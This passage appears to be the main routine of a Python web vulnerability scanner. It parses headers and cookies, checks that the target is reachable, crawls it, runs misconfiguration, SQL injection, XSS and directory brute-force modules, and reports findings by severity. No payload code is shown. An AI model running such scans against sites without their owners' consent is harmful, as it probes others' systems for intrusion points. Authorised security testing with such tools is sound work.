    for h in args.header:
        if ":" in h:
            k, _, v = h.partition(":")
            extra_headers[k.strip()] = v.strip()
    cookies = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()

    client = HttpClient(timeout=args.timeout, delay=args.delay,
                        cookies=cookies, headers=extra_headers, proxy=args.proxy)
    state = ScanState(base_url=args.url, start_ts=time.time())

    # Reachability check
    probe = client.get(args.url)
    if probe is None:
        fail(f"Cannot reach {args.url}")
        sys.exit(1)
    ok(f"Target alive: {probe.status_code} | Server: {probe.headers.get('Server','?')}")

    # Crawl
    if not args.no_crawl:
        Crawler(client, state, max_depth=args.depth, max_urls=args.max_urls).run(args.url)
        state.crawled_urls.add(args.url)
    else:
        state.crawled_urls.add(args.url)

    # Modules
    if args.full or args.audit:
        MisconfigAudit(client, state).run(args.url)
    if args.full or args.sqli:
        SqliScanner(client, state, time_delay=args.time_blind).run()
    if args.full or args.xss:
        XssScanner(client, state).run()
    if args.full or args.dirs:
        DirBuster(client, state, load_wordlist(args.wordlist)).run(args.url)

    # Summary
    print(colorize("\n────── Findings Summary ──────", "bold"))
    counts: Dict[str, int] = {}
    for f in state.findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
    for sev in ("Critical", "High", "Medium", "Low", "Info"):
        if sev in counts:
            tag = {"Critical": "red", "High": "red", "Medium": "yellow",
                   "Low": "cyan", "Info": "blue"}[sev]
            print(f"  {colorize(sev, tag):<25} {counts[sev]}")
    ok(f"Total findings: {len(state.findings)} | Duration: "
       f"{round(time.time() - state.start_ts, 2)}s")

    if args.json:
        write_json_report(state, args.json)
    if args.html:
        write_html_report(state, args.html)


if __name__ == "__main__":
    main()
